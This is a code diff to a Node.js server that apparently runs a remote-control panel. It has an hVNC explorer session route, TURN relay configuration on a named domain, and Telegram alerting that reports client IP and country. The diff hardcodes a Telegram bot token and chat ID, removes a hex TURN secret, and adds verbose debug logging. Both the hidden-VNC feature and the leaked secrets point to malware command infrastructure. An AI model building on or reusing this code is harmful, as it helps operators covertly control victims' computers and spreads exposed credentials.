@@ -6,6 +6,7 @@ const fetch = require('node-fetch');
 const helmet = require('helmet');
 const morgan = require('morgan');
 const path = require('path');
+const axios = require('axios');
 const fs = require('fs');
 const { spawn, exec } = require('child_process');
 const net = require('net');
@@ -72,20 +73,20 @@ function turnCredentials(ttlSeconds = 86400) {
 
 // ─── TURN ICE SERVERS (coturn @ driveone.online) ──────────────
 function getIceServers() {
-  if (!TURN_SECRET || TURN_SECRET === '9d8ebd5cbc8149e5a6607460e3729deb380908dcd483456c80af2716eee2be2f') {
-    console.warn('[TURN] TURN_SECRET missing/placeholder - serving STUN only');
+  if (!TURN_SECRET || TURN_SECRET === 'CHANGE_ME') {
+    console.warn('[TURN] TURN_SECRET missing - serving STUN only');
     return [
       { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }
     ];
   }
-  const { username, credential } = turnCredentials(3600); // 1h ephemeral creds
+  const { username, credential } = turnCredentials(3600);
   return [
     { urls: ['stun:driveone.online:3478', 'stun:stun.l.google.com:19302'] },
     {
       urls: [
-        'turn:driveone.online:3478',                // UDP relay
-        'turn:driveone.online:3478?transport=tcp',  // TCP relay (firewall-proof)
-        'turns:driveone.online:5349'                // TLS relay (firewall-proof)
+        'turn:driveone.online:3478',
+        'turn:driveone.online:3478?transport=tcp',
+        'turns:driveone.online:5349'
       ],
       username,
       credential
@@ -2035,8 +2036,8 @@ app.post('/api/hvnc_explorer/kill/:sessionId', verifyToken, (req, res) => {
 
 // ─── TELEGRAM CONFIG ──────────────────────────────────────────────
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_BOT_TOKEN = '8660630244:AAFyKzFnq3-Gt2viRCfjaGqXinqCOQJHlOk';
+const TELEGRAM_CHAT_ID = '-1004305809042';
 
 
 // ─── HELPER: Get country from IP ──────────────────────────────────
@@ -2080,15 +2081,59 @@ function getClientIP(req) {
 
 async function sendTelegramAlert(message) {
     try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await axios.post(url, {
-            chat_id: TELEGRAM_CHAT_ID,
+        // ✅ Debug: Log the URL being called (without exposing full token)
+        const botToken = '8660630244:AAFyKzFnq3-Gt2viRCfjaGqXinqCOQJHlOk';
+        const chatId = '-1004305809042';
+        
+        console.log('📡 Sending Telegram alert...');
+        console.log(`📡 Bot Token: ${botToken ? botToken.substring(0, 10) + '...' : 'MISSING'}`);
+        console.log(`📡 Chat ID: ${chatId || 'MISSING'}`);
+        
+        // ✅ Check if token and chat ID are set
+        if (!botToken || botToken === 'YOUR_BOT_TOKEN_HERE') {
+            console.error('❌ Telegram bot token is missing or not configured!');
+            return;
+        }
+        
+        if (!chatId || chatId === 'YOUR_CHAT_ID_HERE') {
+            console.error('❌ Telegram chat ID is missing or not configured!');
+            return;
+        }
+        
+        // ✅ Make sure the URL has /bot prefix
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        console.log(`📡 URL: https://api.telegram.org/bot${botToken.substring(0, 10)}.../sendMessage`);
+        
+        const response = await axios.post(url, {
+            chat_id: chatId,
             text: message,
             parse_mode: 'HTML'
         });
-        console.log('✅ Telegram alert sent:', message);
+        
+        console.log('✅ Telegram alert sent successfully!');
+        return response.data;
+        
     } catch (error) {
-        console.error('❌ Failed to send Telegram alert:', error.message);
+        console.error('❌ Failed to send Telegram alert:');
+        
+        if (error.response) {
+            // The request was made and the server responded with a status code
+            console.error(`📡 Status: ${error.response.status}`);
+            console.error(`📡 Response data:`, error.response.data);
+            
+            if (error.response.status === 404) {
+                console.error('💡 Fix: Your bot token is invalid or the URL format is wrong.');
+                console.error('💡 Make sure you have "/bot" before your token.');
+                console.error('💡 Example: https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage');
+                console.error('💡 Get a new token from @BotFather on Telegram.');
+            }
+        } else if (error.request) {
+            // The request was made but no response was received
+            console.error('📡 No response received. Check your internet connection.');
+        } else {
+            // Something else happened
+            console.error('📡 Error:', error.message);
+        }
     }
 }
 
